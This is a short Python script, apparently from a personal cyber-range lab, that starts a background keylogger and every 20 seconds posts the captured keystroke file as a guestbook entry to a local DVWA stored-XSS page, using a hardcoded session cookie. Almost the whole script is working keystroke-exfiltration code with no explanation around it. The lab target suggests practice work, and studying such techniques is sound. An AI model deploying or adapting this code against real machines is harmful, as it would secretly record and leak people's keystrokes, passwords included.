#!/usr/bin/env python3

import requests
import time
import os
from pynput.keyboard import Listener

startlog = time.time()

os.system("python3 /home/kali/Desktop/scripts/Python_Scripting_Cyber_Range/Keyloggers/keyloggerRemote.py &")
time.sleep(1)

def send_request():
    cookies = {'PHPSESSID':'ln300jid39fqgllucam2l4kscb', 'security':'low'}
    url='http://127.0.0.1/dvwa/vulnerabilities/xss_s/'
    form_input = open("/home/kali/Desktop/scripts/keyboard_Input.txt")
    form_send = form_input.read()
    form_data = {'txtName':'Vader', 'mtxMessage':f"'{form_send}'", 'btnSign':'Sign+Guestbook'}
    r = requests.post(url, cookies=cookies, data=form_data)

def interval():
    global startlog
    if time.time() - 20 > startlog:
        print('its been 20 seconds')
        send_request()
        startlog = time.time()

counter = 0
while True:
    counter += 1
    print(counter)
    interval()
    time.sleep(1)



